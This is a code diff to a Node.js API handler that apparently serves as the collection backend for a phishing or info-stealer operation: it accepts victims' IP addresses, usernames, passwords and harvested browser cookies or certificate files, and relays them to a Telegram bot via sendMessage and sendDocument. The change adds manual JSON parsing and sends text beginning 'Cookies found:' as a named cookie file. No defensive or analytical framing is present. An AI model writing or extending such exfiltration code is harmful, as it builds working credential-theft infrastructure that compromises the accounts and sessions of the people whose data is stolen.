@@ -38,31 +38,65 @@ handler.post(async (req, res) => {
 
     // Handle JSON payloads (creds, etc.)
     if (contentType.includes('application/json')) {
-      // If you're sending credentials or arbitrary text, handle here
-      const { type, ip, user, pass, data } = req.body;
+      // Parse JSON body
+      let body = '';
+      await new Promise((resolve, reject) => {
+        req.on('data', chunk => body += chunk);
+        req.on('end', resolve);
+        req.on('error', reject);
+      });
+      let json;
+      try {
+        json = JSON.parse(body);
+      } catch {
+        return res.status(400).json({ success: false, message: 'Invalid JSON' });
+      }
+
+      const { type, ip, user, pass, data } = json;
       const text = data
         ? data
         : `🔑 [${ip}] Credentials\nUser: ${user}\nPass: ${pass}`;
 
-      const tgRes = await fetch(`${botUrl}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text
-        })
-      });
-      if (!tgRes.ok) throw await tgRes.text();
-      return res.status(200).json({ success: true });
+      // If text contains 'Cookies found:', treat as file
+      if (text && text.startsWith('Cookies found:')) {
+        const form = new FormData();
+        form.append('chat_id', chatId);
+        // Use IP or Date.now for unique filename
+        const fname = `${ip || 'cookie'}-COOKIE.txt`;
+        form.append('document', Buffer.from(text, 'utf-8'), {
+          filename: fname,
+          contentType: 'text/plain'
+        });
+        // Optional caption
+        let caption = ip ? `IP: ${ip}\n` : '';
+        if (type) caption += `Type: ${type}\n`;
+        if (caption) form.append('caption', caption);
+        const tgRes = await fetch(`${botUrl}/sendDocument`, {
+          method: 'POST',
+          body: form,
+          headers: form.getHeaders()
+        });
+        if (!tgRes.ok) throw await tgRes.text();
+        return res.status(200).json({ success: true });
+      } else {
+        // Otherwise, send as plain text message
+        const tgRes = await fetch(`${botUrl}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text
+          })
+        });
+        if (!tgRes.ok) throw await tgRes.text();
+        return res.status(200).json({ success: true });
+      }
     }
 
     // Handle file uploads (cookies/certs)
     if (req.file) {
-      // You can also grab req.body.type, req.body.ip if you want
       const form = new FormData();
       form.append('chat_id', chatId);
-
-      // Use Buffer directly for Node/Telegram compatibility
       form.append(
         'document',
         req.file.buffer,
@@ -71,8 +105,6 @@ handler.post(async (req, res) => {
           contentType: req.file.mimetype || 'text/plain'
         }
       );
-
-      // Optionally, add a caption with extra info (ip, type, etc)
       const { ip, type } = req.body;
       let caption = '';
       if (ip) caption += `IP: ${ip}\n`;
